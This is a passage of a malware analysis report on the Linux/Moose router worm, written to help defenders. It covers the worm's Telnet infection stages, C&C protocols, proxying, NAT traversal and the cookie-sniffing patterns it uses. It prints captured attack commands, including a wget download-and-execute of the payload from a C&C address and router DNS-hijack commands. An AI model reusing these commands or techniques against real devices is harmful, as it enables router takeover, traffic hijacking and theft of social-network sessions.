usually a “download and execute” procedure. Depending on the victim’s\noutput the steps will be repeated until a \"Status OK\" string is received from the victim — meaning\nthe malware was installed and started — or the report C&C server stops sending commands. If you\nare interested in the details, read-on, otherwise feel free to skip to the next section.\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\n###### First stage\n\nAfter the C&C reply, Moose continues with infection, executing commands on the victim device.\nHere is captured interaction of the successful first stage of the infection process performed by the\nscanning worm. Note that this is all automated and not performed interactively by the operator.\n\n```\n> sh\nBusyBox v1.00 (2013.12.12-03:56+0000) Built-in shell (msh)\nEnter 'help' for a list of built-in commands.\n# ps\n  PID Uid VmSize Stat Command\n    1 admin 468 S init\n[...]\n# echo -n -e \"H3lL0WoRlD\"\nH3lL0WoRlD# chmod\nBusyBox v1.00 (2013.12.12-03:56+0000) multi-call binary\nUsage: chmod [-R] MODE[,MODE]... FILE...\nEach MODE is one or more of the letters ugoa, one of the\nsymbols +-= and one or more of the letters rwxst.\nOptions:\n  -R Changes files and directories recursively.\n# cat /proc/cpuinfo\n[...]\nsystem type : MIPS Malta\nprocessor : 0\ncpu model : MIPS 24Kc V0.0 FPU V0.0\n[...]\n\n```\n\nA couple of things are done here:\n\n- Obtaining an interactive shell on the target victim\n\n- Testing whether the echo command works\n\n- Looking at the process list (ps) for itself and for competing botnets\n\n- Making sure chmod is present\n\n- Gathering the contents of /proc/cpuinfo\n\nAt this point, Moose has not yet infected its new victim. It will then send a message to the report\nC&C server with what it has learned so far about the target victim:\n\n\nTable 3. Report shell access protocol\n\n\nName Size Description\n\nVersion Integer (4 bytes) Version of the malware\n\nMessage type Integer (4 bytes) Set to 15, meaning console access was obtained\n\nIP address Integer (4 bytes) IP address of the victim\n\nUser/pass entry Integer (4 bytes) The offset of the username and password used\nto gain entry to the router\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\nName Size Description\n\nVictim details Bit field (4 bytes) Details about the victim. See infect_state\nenumeration to see what information it holds.\n\nUnused 20 bytes Unused\n\nCPU Model size Integer (4 bytes) Size of the CPU Model string\n\nCPU Model CPU Model size bytes The obfuscated \"cpu model:\" line out\nof /proc/cpuinfo\n\nProcessor size Integer (4 bytes) Size of the Processor string\n\nProcessor Processor size bytes The obfuscated \"processor:\" line out\nof /proc/cpuinfo\n\n###### Bit field about the infection state\n\n```\nenum infect_state {\n  NO_CHMOD = (1 << 0), // set if chmod command is not present\n  NO_ECHO = (1 << 1), // set if echo command is not present\n  FOUND_NEAR_SCAN = (1 << 2), // set if victim was found during a near /15 scan\n  PS_BLKLST_HIT = (1 << 7), // set if a process-to-kill is found in the list\n                   // of running processes\n};\n\n```\n\nThe report C&C server responds with obfuscated commands to execute on the victim:\n\n\nTable 4. Report shell access response\n\n\nName Size Description\n\nCommand size Integer (4 bytes) Size of the command string\n\nCommand command size bytes The obfuscated command to be sent to the victim\n\n\n… repeat … Integer (4 bytes) +\ncommand size bytes\n\n\nZero or more commands until the terminator below\n\n\nTerminator Integer (4 bytes) Always 0. Ends the sequence of commands\n\n###### Second stage\n\nWe now enter the second stage of infection. Each command is decrypted and executed on the victim\nvia Telnet. Typically, this consists of a download and execute but the architecture is flexible and would\nallow any arbitrary commands to be executed.\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\nWe’ve witnessed two main class of commands sent to perform the infection. The first one is a classic\ndownload and execute using wget:\n\n```\n# cd /var\n# rm ./elan2\nrm: cannot remove `./elan2': No such file or directory\n# wget http://77.247.177.36:81/xx/atheros_mips/elan2\nConnecting to 77.247.177.36[77.247.177.36]:81\n200 OK, File Get Success\n# chmod +x ./elan2\n# ./elan2\nSys init: OK\nStatus: OK\n\n```\n\nThe second technique is encoding the binary into several echo commands that are executed\non the victim and redirecting output into a file that is later executed:\n\n```\n# cp /bin/ls /dev/elan2\n# echo -n -e \"\\x7f\\x45\\x4c\\x46\\x01\\x01\\x01\\x61\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\\n> \\x02\\x00\\x28\\x00\\x01\\x00\\x00\\x00\\x90\\x81\\x00\\x00\\x34\\x00\\x00\\x00\\xb4\\xe9\\x01\\\n> \\x00\\x02\\x00\\x00\\x00\\x34\\x00\\x20\\x00\\x03\\x00\\x28\\x00\\x0d\\x00\" > /dev/elan2\n# echo -n -e \"\\x9d\\xe8\\xbc\\x1d\\x03\\x00\\x44\\x90\\x02\\x00\\x94\\xd8\\x02\\x00\\xa4\\x1d\\\n> \\x03\\x00\\x0d\\xc0\\xa0\\xe1\\x00\\xd8\\x2d\\xe9\\x04\\xb0\\x4c\\xe2\\xa4\\xd0\\x4d\\xe2\\xa8\\\n> \\x00\\x0b\\xe5\\x01\\x30\\xa0\\xe1\\xac\\x30\\x4b\\xe5\\x01\\x30\\xa0\\xe3\" >> /dev/elan2\n...\n# echo -n -e \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x5c\\xe9\\x01\\x00\\x56\\x00\\\n> \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" >> /\ndev/elan2\n# chmod +x /dev/elan2\n# /dev/elan2\nSys init: OK\nStatus: OK\n\n```\n\nNo matter the method, by that point the victim has been infected: it will reach the configuration\nC&C server, obtain its configuration parameters, and start its nefarious activities.\n\nThis two-stage mechanism allows for the report C&C server to specify a URL to an ELF binary\nthat will match the architecture and environment found by the various checks it performed.\nPlus, it enables the operators to add support for new target platforms without having to upgrade\ntheir botnet — but only their distribution methods on the report C&C server.\n\n###### Moose’s Excentricity — Optional Behaviors\n\nWe just described the most common scanning behavior, but its configuration can alter\nhow it is performed. Here a summary of some of those configuration flags and their effects:\n\n\nTable 5. Partial List of Moose's Configuration Flags\n\n\nConfiguration parameter Description\n\ncnccfg_flag_scanner_sniffer If this flag is disabled there will be no per-interface\nscanner\n\ncnccfg_flag_nolocalscan Disables the closely related IP address network scan\n\ncnccfg_flag_noextscan Disables the random IP address scan\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\nConfiguration parameter Description\n\ncnccfg_flag_test10073 Don’t try to connect to TCP port 10073 first. Try Telnet\nport directly.\n\ncnccfg_flag_share_peers Do not communicate to the report C&C server when\ninfected peers are found (through TCP on 10073)\n\n###### Moose Grand Theft Auto — DNS Hijacking\n\nLastly three parameters require more explanation cnccfg_flag_hijackdns, cnccfg_hijackdns1_ip\nand cnccfg_hijackdns2_ip. If the first parameter is enabled, it will run the following commands\non the Telnet console before trying to obtain a shell. The %s %s is replaced with the two DNS\nIP addresses provided in the configuration.\n\n\nWhat is DNS Hijacking?\nDNS Hijacking consists of changing the DNS servers used by a victim in order\nto perform other attacks like phishing or man-in-the-middle. DNS servers do\nthe domain name to IP address translation. A malicious DNS server can change\n(or hijack) that translation so that any legitimate domain name will resolve\nto an IP address of the attackers' choice. This means that traffic intended for\na certain specified address may be redirected to another, entirely unrelated\naddress.\n\n```\nset lan dhcp server\nset lan dhcpdns %s %s\ndns config static %s %s\nsave\n\n```\n\nThe code attempts to replace the legitimate DNS servers used by the target router with malicious\nservers. However there are a lot of different text-based user interfaces for such devices. This probably\nexplains why it is attempting to do so using more than one method. Quick googling reveals\n[that at least some of TP-Link, Zyxel, Zhone and Netgear models support one of these commands.](http://forum.tp-link.com/showthread.php%3F75896-Exploit-changes-DNS-settings-and-disable-LAN-interfaces)\nThe code is not concerned with error-handling, it will resume execution after the DNS hijacking\nattempt regardless of any errors encountered.\n\nThis method of scanning is a straightforward yet effective way of finding new targets to copromise.\nGoing for IP addresses nearby is clever and probably yields to higher infection rate because it might\nbe scanning past firewalls as we will cover in the next section.\n\n###### 5.2. Going Deep in the Tundra — Spreading Past Firewalls\n\nOne of the most interesting aspects of this threat is its ability to go deep inside networks, trying hard\nto spread past firewalls. Two different mechanisms will be at play here: first, a spreading mechanism\nthat understands the realities of large network firewall configurations and second, support for custom\n[NAT traversal. This section will describe both behaviors.](http://en.wikipedia.org/wiki/NAT_traversal)\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\n###### Scanning close to home\n\nAs we mentioned earlier, the configuration C&C server returns the public IP address it saw when\nit was contacted by the infected router. This IP address is then used as a basis for near-home scanning\non the Telnet port. The IP addresses reached this way are random, but all inside the same /15 network\nof the infected router’s public IP. This can effectively bypass firewalls on the perimeter and allow\nthe worm to spread further copies of itself.\n\nmisconfigured\nconsumer router\n\nInternet\n\n1 2\n\nSame misconfigured\nprovider\n\nfirewall\n\nnetwork\n\n3 3\n2\n\nmisconfigured misconfigured misconfigured\nconsumer router consumer router consumer router\n\nFigure 14 Scan from the Internet or near home\n\nThe above diagram illustrates why the operators focus more on the near home scanning. Black lines\nrepresent network connectivity and yellow arrows represent network interactions.\n\nHere we highlighted:\n\n1. An infected router trying to spread from across the Internet can’t get past the firewall\n\n2. An infected router able to propagate past a badly firewalled router that is exposing its Telnet\n\nservice to the whole Internet\n\n3. How, due to the near home scan, routers behind the same network have a greater chance\n\nof being quickly found and infected if the firewall is allowing Telnet from the same network.\n\n|gured router|ured outer|\n|---|---|\n|t||\n|||\n\n|Col1|Col2|\n|---|---|\n|3|3|\n||3|\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\nDuring our monitoring of an infected device we saw that Telnet access was 3 times more successful\nwhen scanning for near-home IP addresses than when scanning random IP addresses on the Internet.\nWe think this difference is explained by NAT and misconfigured firewalls. This doesn’t surprise us given\nthe complexity of modern networks and the amount of firewall rules they need. Furthermore,\n[a study of firewall rules by Avishai Wool demonstrated a correlation between the complexity](https://www.eng.tau.ac.il/~yash/05440153.pdf)\nand volume of firewall rules and the number of errors made in their configuration — badly lockeddown Telnet access being one of the errors mentioned in the study.\n\nAdditionally, the worm will launch an extra scanner thread per IP interface present on the system,\ncarefully avoiding /32 IPs (IP aliases) and loopback interfaces (like 127.0.0.1):\n\nFigure 15 Netmask check\n\nFigure 16 Loopback check\n\nThis enables the worm to spread inside Local Area Networks (LANs) that are not normally accessible\nfrom the Internet due to the use of firewalls and network address translation (NAT). On successful\ninfection, the newly-compromised machine will spawn scanners on its own internal IP interfaces\nand thus go deeper inside the private network.\n\n[This type of automated network pivoting is very interesting for a couple of reasons:](http://en.wikipedia.org/wiki/Exploit_%2528computer_security%2529%23Pivoting)\n\n- Some networks assume perimeter that firewalls are enough protection and often tolerate\n\nthe use of weak credentials internally\n\n[• Routers are the highly connected vertices of the Internet graph. Access to them means access](http://cheswick.com/ches/map/gallery/index.html)\n\nto previously unreachable vertices.\n\n- All sort of networks could be revealed to the operators: 3rd party vendors, business partners,\n\nprivate clouds, extranets, etc.\n\n- Network provider equipment has been traditionally managed via Telnet\n\n- Consumer devices in-the-field tend to reset to factory defaults, which render them vulnerable\n\neven if provider had applied due diligence by changing default credentials\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\n###### Custom NAT traversal\n\nAnother interesting capability related to network penetration is the custom NAT traversal\nimplementation. It could be categorized as a simple implementation of the concepts behind\n[the Session Traversal Utilities for NAT (STUN) and Traversal Using Relays around NAT (TURN)](http://en.wikipedia.org/wiki/STUN)\nstandards.\n\nThe configuration given by the configuration C&C server to the infected host provides both its\npublic IP address and the address of a system that is going to be used as a relay (relay C&C server).\nDuring our analysis of the threat the relay C&C IP address was always the same: 93.190.140.221.\nThe configuration values affecting the behavior of the NAT traversal are the following:\n\n\nTable 6. Moose Configuration Values Affecting the Behavior of the NAT Traversal\n\n\nConfiguration parameter Description\n\ncnccfg_flag_nattraversal NAT traversal is or is not enabled\n\n`cnccfg_relaycnc_ip` Relay C&C IP address\n\n`cnccfg_relaycnc_sleep` Number of seconds to sleep in case of protocol failure\nwith the relay C&C server\n\n`cnccfg_relaycnc_timeout` Number of seconds to wait for data from the relay C&C\nserver. Default: 300\n\nWe will explain where these values come from when we will describe the configuration C&C network\nprotocol further along.\n\nIf NAT traversal is enabled, two threads are created at start-up that are dedicated to reach\nthe relay C&C server. The relay is queried at short intervals (defined by cnccfg_relaycnc_sleep)\nfor anything to proxy through the infected host. The server replies either with one IP address and port\n(for outreach) or multiple pairs of IP addresses and ports (for relay).\n\nFirst the infected device reaches out to the relay with this hardcoded packet:\n\n```\n18 00 00 00\n\n```\n\nThe server responds with the following structure:\n\n\nTable 7. Moose relay C&C server response\n\n\nName Size Description\n\nCommand Short (2 bytes) Command given to the infected host to execute.\nSee table below.\n\nDestination port Short (2 bytes) Tunnel destination port (network order)\n\nDestination IP address Integer (4 bytes) Tunnel destination IP address (network order)\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\nTable 8. Moose NAT traversal supported commands\n\n\nCommand Action\n\n`0x0016` Sleep\n\n`0x0017` Multiple tunnel [7]\n\nAnything else TCP tunnel is created between relay C&C server\nand destination IP address and port\n\nFor example:\n\n```\n00 00 00 50 c0 a8 01 01\n\\-1-/ \\-2-/ \\----3----/\n\n```\n\n1. Mode requested by relay C&C server. ex: TCP Tunnel\n\n2. Tunnel destination port (network order). ex: 80\n\n3. Tunnel destination IP address (network order). ex: 192.168.1.1\n\nThe infected host will then connect on the tunnel destination it has received. Upon successful\nconnection, it will hand over the two sockets to a thread dedicated to move the data back and forth\nbetween the tunnel destination and the relay C&C server.\n\nFigure 17 NAT traversal tunnel in action\n\n7 The multiple tunnel packet format varies from the simple TCP tunnel. Due to time constraints\nit was not documented. Interested readers should look at virtual address 0x405A4C\nof the bf 2 99450977d 7b 2 `0879fb17 612 248` sample\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\nThis way, even if a host is unreachable from the Internet because of firewalls or NAT, the operators\ncan still use the infected host. During our monitoring of the threat, we saw tunnels being made\nto reach social networks. However, most of the time, the server was seen to respond with\na TCP reset (RST) and sometimes sleep commands.\n\n###### 5.2. Moose Crossing — Proxy Service\n\nOne of the first thing Linux/Moose does is to start listening on TCP port 10073 for incoming connections.\nAs was previously discussed, this server is used by the bot to assess whether a system is infected.\nWhen some Linux/Moose scanner thread reaches an opened 10073 port, it will result in a TCP handshake\nwithout a data payload.\n\nHowever when we look at the code, we find that a limited number of IP addresses are allowed through:\n\nFigure 18 Moose Whitelist Validation Assembly\n\nThe is_in_whitelist function makes sure that the source IP address of the connection\nis in a list of IP address given by the configuration C&C server earlier. If it is, then the socket\nand some configuration is passed to a thread that will handle the connection.\n\n**Note** **The whitelist**\n\nThese are the only IP addresses allowed to interact with the malware.\nAccording to our monitoring, the addresses in the list haven’t changed\nin months but it will likely be modified after the operators become aware\nof this report. These servers could be either operator-owned or compromised.\nThe current whitelist of IP addresses is available in the appendix sections\nunder Indicators of Compromise (IOC).\n\nThe presence of a whitelist and the fallback behavior of closing the socket after a successful\nTCP handshake implies that we can’t enumerate infected hosts by scanning the whole Internet\non port 10073.\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\n###### Proxy Server Worker\n\nThe proxy server worker thread processes the connection from a whitelisted IP address. Upon connection\nthe server will read a single byte. Depending on that command byte, one of four things can happen:\n\n\nTable 9. Proxy Server Worker Commands\n\n\nFirst byte Proxy technique\n\n`0x04` [SOCKS 4](http://www.openssh.com/txt/socks4.protocol)\n\n`0x05` [SOCKS 5](http://tools.ietf.org/html/rfc1928)\n\nI, i, p, P, g, G, c, C HTTP Proxy (with HTTPS support)\n\nOtherwise Connection is closed\n\nThese are all classic protocols to use when one wants to have Internet traffic appear as if it was\noriginating from the infected device. The worm uses this approach to leverage the good IP address\nreputation of big internet service providers (ISP) clients with regards to casual browsing like viewing\nads, send emails or interact with social networks. Doing any of these activities in bulk from a few\ndata-center IP addresses would draw unwanted attention.\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\n###### SOCKS 4 Proxy\n\nThe implementation of the SOCKS 4 proxy is according to specifications. It enables the establishment\nof a TCP tunnel from the infected server to a host specified by the connecting party. After the initial\nhandshake, traffic is sent transparently back and forth between the client of the infected service\nand the specified host.\n\nFigure 19 Example of a SOCKS 4 tunnel\n\nHere you can see the SOCKS exchange (1) with the tunnel destination information. Once the infected\nhost replied that the connection is successful (0x5a) then the client (botnet operator) sends\nits HTTP request (2) to have it proxied through the infected machine. The infected host will finally\nreturn the response it received from the tunnel destination (3). In this case, it is a request to upgrade\nto HTTPS via a Location header.\n\nThis has been by far the most active protocol while we have been monitoring.\n\n###### SOCKS 5 Proxy\n\nVery similar to SOCKS 4, SOCKS 5 is a protocol to allow TCP tunnels to be created between the server’s\nclient and an arbitrary host. The malware’s implementation is incomplete and only supports\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\nthe \"No authentication\" authentication method. This partial support is likely to be enough\nfor the operators since they already have the whitelist mechanism in place to prevent unwanted\nhosts from accessing the malware. We believe it was implemented in order to support a maximum\nnumber of client applications.\n\n###### HTTP Proxy\n\nThe HTTP proxy is a basic yet complete HTTP/1.1 proxy. It looks at the HTTP headers, resolves\nthe destination host, connects to it and sends the data back to the client.\n\n[It will also honor the CONNECT method if it is present enabling HTTPS to be proxied through.](http://en.wikipedia.org/wiki/HTTP_tunnel%23HTTP_CONNECT_tunneling)\n\nFigure 20 Looking for CONNECT method\n\nWhichever proxy technique is used, anything that tries to deal with destination TCP ports 25 (SMTP),\n465 (STMPS) or 587 (Submission) will require a special flag to be set in the whitelist configuration sent\nby the configuration C&C server. Most of the whitelisted server have this flag turned off.\n\nThe mechanisms described above allow the botnet operator to leverage the good IP reputation\nof the infected devices in a very lightweight, flexible and inconspicuous manner.\n\n###### 5.4. Moose’s Sense of Smell — Sniffing Capabilites\n\nLinux/Moose is able to eavesdrop on traffic going through affected devices. This is a particularly\ninteresting capability considering that routers are often forward all sorts of traffic. This section will\ndescribe this behavior.\n\nEnabling, this functionality requires two different configuration flags to be set: cnccfg_flag_\n```\nscanner_sniffer and cnccfg_flag_thd_sniffer. When set, these will spawn a sniffer thread\n\n```\non all non-loopback interfaces that have received at least 101 packets. This check is done in order\nto avoid creating threads for interfaces that will not carry potentially interesting traffic.\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\nThe thread dedicated to eavesdropping is rather simple. It creates a raw socket, sets the interface\nin promiscuous mode, then loops on a recvfrom as depicted below.\n\nFigure 21 Sniffing Network Traffic\n\nIn order to avoid doing too much work, only TCP packets are inspected. They are searched for strings\nthat were sent by the configuration C&C server as snfcfg_<id>_needle in the network protocol\nanalysis detailed later.\n\nCurrently the network sniffers are configured to search for the following strings:\n\n- `twll=`\n\n- `twid=`\n\n- `LOGIN_INFO=`\n\n- `c_user=`\n\n- `ds_user_id=`\n\n- `SAPISID=`\n\n- `APISID=`\n\n- `PLAY_ACTIVE_ACCOUNT=`\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\nAs previously mentioned, these are the HTTP cookies used by popular social network sites.\n\nOnce a match is found, the whole packet including its Ethernet, IP, TCP headers and payload is sent,\nobfuscated, to the report C&C server. The exact format is described below.\n\n\nTable 10. Report sniffed packet\n\n\nName Size Description\n\nVersion Integer (4 bytes) Version of the malware\n\nMessage type Integer (4 bytes) Set to 20 meaning the sniffer found a string it was\nlooking for in the network traffic\n\nPacket size Integer (4 bytes) Size of the sniffed packet\n\nUnused 28 bytes Unused\n\nPacket Packet size bytes Encrypted raw packet containing the string of\ninterest\n\nThe reply packet is:\n\n\nTable 11. Response to a report sniffed packet\n\n\nName Size Description\n\nUnknown field Integer (4 bytes) Usage unknown.\n\nMessage type Integer (4 bytes) Same as in the request (20)\n\nPacket size Integer (4 bytes) Same as in the request\n\nUnused 28 bytes Unused\n\nThis mechanism is very interesting. It is lightweight enough to run on small embedded devices\nand yet it gives a lot of contextual information to the operators to do all sort of mischief by stealing\nimportant data.\n\n###### 5.5. Competitive Moose — Cleaning other Malware\n\nMoose is a combative animal. Every hour, it goes through every process entry under /proc/<pid>/\nand searches thoroughly through the cmdline file. cmdline holds the process original name, and any\narguments given to it at startup, separated by null bytes (0x00). Going through this list, it will send\na kill signal to any process that matches any of the blacklisted strings. This blacklist, as opposed\nto many of the other characteristics of this malware, is hardcoded in the binary.\n\nThis function requires a configuration flag to be set: cnccfg_flag_killprocess. During our monitoring\nof the threat’s traffic this flag was always on.\n\nHere is the blacklist:\n\n```\n--scrypt\nstratum+tcp://\ncmd.so\n/Challenge\n/.usb2\n/.scan\n/.ipt\n\n```\n\n-----\n\n## Dissecting Linux/Moose\n\n\n[All these entries are related to digital currency mining operations — something performed by other](http://www.symantec.com/connect/blogs/iot-worm-used-mine-cryptocurrency)\n[embedded threats. Killing these processes is probably done to make sure that all of the limited](http://www.symantec.com/connect/blogs/iot-worm-used-mine-cryptocurrency)\nresources of the system are available to Linux/Moose. The cmd.so string seems specific to the\n[Synology Disk Miner. /.usb2, /.scan and ./ipt all lead to the same ARM Linux miner worm.](http://www.virusradar.com/en/Linux_Svirtu.A/description)\nMost of these other worms also leverage weak or default credentials, so it makes sense\nthat they try to get rid of each other.\n\n###### 5.6. Moose Communication — Configuration C&C Server Protocol\n\nWe are giving a very detailed description of the network protocol to enable affected organizations\nto apply this knowledge to their defense mechanism. The operators of Linux/Moose can recompile\nand modify binaries to avoid detection but modifying their network protocol takes more time,\nwhich is why we share this information in the hopes of negatively affecting their operation.\n\nBelow is the protocol described in text aimed at describing the components' interactions.\n[To deobfuscate quickly the traffic that was captured, we refer you to our malware-research](https://github.com/eset/malware-research/tree/master/moose/)\n[repository on Github where we added tshark commands and Python code to see the traffic](https://github.com/eset/malware-research/tree/master/moose/)\ndescribed below.\n\nThere are two typical exchanges with the configuration C&C server. One is done every hour and one\nis done every four hours. The only difference between the two exchanges is that they update different\nvariables in the client. However almost all of the data is still sent by the C&C. The only difference\nis that the username and password list used for bruteforce attacks is omitted in the hourly run.\n\nHere is what a configuration exchange with the configuration C&C server looks like:\n\nFigure 22 Capture of a Configuration Exchange with C&C\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\nThe structure of the data sent to the configuration C&C server is the following:\n\n\nTable 12. Moose requests to configuration C&C server\n\n\nName Size Description\n\nVersion Integer (4 bytes) Version of the malware\n\nMessage type Integer (4 bytes) Set to 1 meaning bot configuration\n\nLoop Count Integer (4 bytes) Number of times the main loop ran. Indicates\nthe age of the infection.\n\nLocal scans Integer (4 bytes) The number of IP addresses that was scanned\nin near-home mode\n\nExternal scans Integer (4 bytes) The number of IP addresses that was scanned\nin random mode\n\nPer-interface scans Integer (4 bytes) The number of IP addresses that was scanned\nin per-interface mode\n\nKilled processes Integer (4 bytes) The number of killed processes\n\nBot details Bit field (4 bytes) More information about the bot state. See\ncnc_request_flags enumeration to see what\ninformation it holds.\n\nUnused 8 bytes Unused\n\n###### Bit field about the bot details\n\n```\nenum cnc_request_flags {\n  BRUTEFORCE_LIST = (1 << 0), // Set if bot wants the username and password list\n  WRITE_ACCESS = (1 << 1), // Set if filesystem is writable. Deprecated.\n  TIME_PROBLEM = (1 << 7), // Set if time syscall returned 0 or an error.\n                   // New in v31.\n};\n\n```\n\nThe server replies with the configuration for the malware. It is composed of independent blocks\nof configuration information with some being optional. The high-level protocol takes the following form:\n\n\nTable 13. Moose configuration C&C server response\n\n\nName Size Description\n\nHeader 44 bytes Header with bot configuration information\n\nBruteforce list size Integer (4 bytes) Optional field. Size of the username and password\nlist used to compromise other devices\n\n\nBruteforce list Bruteforce list size\nbytes\n\n\nOptional field. Encrypted username and password\nlist used to compromise other devices. It is requested\nby the bot every 4 hours.\n\n\nWhitelist size Integer (4 bytes) Size of the whitelist of IPs allowed to contact\nthe proxy service on port 10073.\n\nWhitelist Whitelist size x 8 bytes The whitelist\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\nName Size Description\n\nSniffer configuration size Integer (4 bytes) Optional field. Number of configuration entries\ngiven to the eavesdrop module.\n\nSniffer configuration Variable size Optional field. Configuration given to the eavesdrop\nmodule.\n\n\nTable 14. Moose header configuration C&C server response\n\n\nName Size Description\n\nExternal IP address Integer (4 bytes) External IP address of the infected device (as seen by\nthe C&C)\n\n\nNumber of local scanner\nthreads\n\nNumber of remote\nscanner threads\n\n\nInteger (4 bytes) Number of threads that will perform closely related\nIP address scan\n\nInteger (4 bytes) Number of threads that will perform random IP\naddress scan\n\n\nAdditional configuration Bit field (4 bytes) More configuration on/off switches packed into a bit\nfield. Expanded in cnc_config_flags enum below.\n\nProxy max clients Integer (4 bytes) Maximum number of simultaneous proxy requests\naccepted on port 10073. Default: 20\n\nRelay C&C Sleep Integer (4 bytes) Number of seconds to sleep in case of protocol failure\nwith the relay C&C server\n\n\nReport C&C server\nIP address\n\nRelay C&C server\nIP address\n\nRelay C&C server\ntimeout\n\n\nInteger (4 bytes) IP address to use as the report C&C server\n\nInteger (4 bytes) IP address to use as the relay C&C server\n\nInteger (4 bytes) Number of seconds to wait for data from the relay\nC&C server. Default: 300\n\n\nDNS server IP address 1 Integer (4 bytes) If DNS Hijacking is enabled, this holds the first DNS\nserver IP address\n\nDNS server IP address 2 Integer (4 bytes) If DNS Hijacking is enabled, this holds the second\nDNS server IP address\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\nWhere these flags can be enabled or not in the additional configuration field:\n\n```\nenum cnc_config_flags {\n  SCANNER_SNIFFER = (1 << 0), // If set, additional scanner and sniffer threads\n                   // are created per network interface\n  NOLOCALSCAN = (1 << 1), // If set, no closely related IPs scan is performed\n  NOEXTSCAN = (1 << 2), // If set, no random IPs scan is performed\n  TEST_10073 = (1 << 3), // If set, infected peer detection is enabled\n  NATTRAVERSAL = (1 << 4), // If set, threads dedicated to NAT Traversal are\n                   // created (only once)\n  RECONTACT_CNC = (1 << 5), // If set, will recontact the configuration C&C\n                   // server shortly (instead of 4hrs)\n  HIJACKDNS = (1 << 6), // If set, modify the DNS configuration of victims\n                   // on new infections\n  THD_SNIFFER = (1 << 7), // If set, the eavesdrop component is activated\n  KILLPROCESS = (1 << 10), // If set, will kill competing malware processes\n  SHARE_PEERS = (1 << 11), // If set, will share found peers to report \n                   // C&C server\n};\n\n```\n\nEach item of the whitelist is sent in the following format. The number of entries is the previously\ndescribed whitelist size.\n\n\nTable 15. Moose whitelist item\n\n\nName Size Description\n\nIP address Integer (4 bytes) IP address allowed to connect on proxy service\non TCP port 10073\n\nEmail Integer (4 bytes) If bit 1 of this field is set to 1 then the server is also\nallowed to use destination ports 25, 465\nor 587 (standard email ports).\n\nEach item of the sniffer configuration is sent in the following format. The number of entries\nis the previously described sniffer configuration size.\n\n\nTable 16. Moose sniffer configuration item\n\n\nName Size Description\n\n\nSniffer configuration\nitem size\n\n\nInteger (4 bytes) Size of the configuration entry\n\n\nSniffer configuration Sniffer configuration\nitem size bytes\n\n\nEncrypted string pattern that the sniffer thread\nlooks for in network traffic.\n\n\nHere is the example configuration shown in the screenshot after being parsed by our Python tool\n(username and password list skipped for brevity):\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\n###### An example request to the configuration C&C server\n```\n   $ ./parse_cnc_request.py cfgcnc.raw\n   {'cnc_request_flags.BRUTEFORCE_LIST': True,\n   'cnc_request_flags.WRITE_ACCESS': True,\n   'loop_count': 453,\n   'msg_type': 1,\n   'msg_type_decoded': 'REQUEST_CONFIG',\n   'nb_extscans': 294,\n   'nb_ifscans': 9,\n   'nb_killed': 0,\n   'nb_localscans': 571,\n   'version': 28}\n\n An example response from the configuration C&C server\n\n```\n```\n$ ./parse_cnc_config.py 4h cfgcnc-response.raw\n{'cnccfg_ext_ip': '<redacted>',\n\n```\n'cnccfg_flag_hijackdns': False,\n```\n 'cnccfg_flag_killprocess': True,\n 'cnccfg_flag_nattraversal': True,\n 'cnccfg_flag_noextscan': False,\n 'cnccfg_flag_nolocalscan': False,\n 'cnccfg_flag_recontactcnc': True,\n 'cnccfg_flag_scanner_sniffer': True,\n 'cnccfg_flag_share_peers': False,\n 'cnccfg_flag_test10073': True,\n 'cnccfg_flag_thd_sniffer': True,\n\n```\n'cnccfg_hijackdns1_ip': 0,\n'cnccfg_hijackdns2_ip': 0,\n```\n 'cnccfg_nb_thdscan_ext': 10,\n 'cnccfg_nb_thdscan_local': 20,\n 'cnccfg_proxy_max_clients': 5,\n 'cnccfg_relaycnc_ip': '93.190.140.221',\n 'cnccfg_relaycnc_sleep': 10,\n 'cnccfg_relaycnc_timeout': 600,\n 'cnccfg_reportcnc_ip': '85.159.237.107',\n 'snfcfg_00_needle': ' twll=',\n 'snfcfg_01_needle': ' twid=',\n 'snfcfg_02_needle': ' LOGIN_INFO=',\n 'snfcfg_03_needle': ' c_user=',\n 'snfcfg_04_needle': ' ds_user_id=',\n 'snfcfg_05_needle': ' SAPISID=',\n 'snfcfg_06_needle': ' APISID=',\n 'snfcfg_07_needle': ' PLAY_ACTIVE_ACCOUNT=',\n 'snfcfg_nb_items': 8,\n 'userpass_list_len': 4475,\n ...,\n 'whitelist_len': 57,\n 'whlst_00_can_email': False,\n 'whlst_00_ip': '77.247.177.31',\n 'whlst_01_can_email': True,\n 'whlst_01_ip': '85.159.237.107',\n 'whlst_02_can_email': False,\n 'whlst_02_ip': '85.159.237.108',\n 'whlst_03_can_email': True,\n 'whlst_03_ip': '192.168.1.3',\n ...,\n 'whlst_56_can_email': False,\n 'whlst_56_ip': '103.238.216.218'}\n\n```\n\n-----\n\n## Dissecting Linux/Moose\n\n\n###### 5.7. Evolution of the Species —Malware changelog\n\n Version 20\n\n- First version we encountered\n\n- ARM variant\n\n###### Version 28 to 29\n\n- Rotation of 3 different configuration C&C server IP addresses instead of one hardcoded\n\n- Improved Telnet connection handling\n\n- Improved Telnet prompt detection\n\n###### Version 29 to 31\n\n- Better handling of low memory situations\n\n- New configuration C&C server request flag: 0x80: TIME_PROBLEM\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\n##### 6. CONCLUSION\n\nLinux/Moose is a novelty when you consider that most embedded threats these days are used\nto perform DDoS attacks. Considering the rudimentary techniques used by Moose in order to gain\naccess to other devices, it 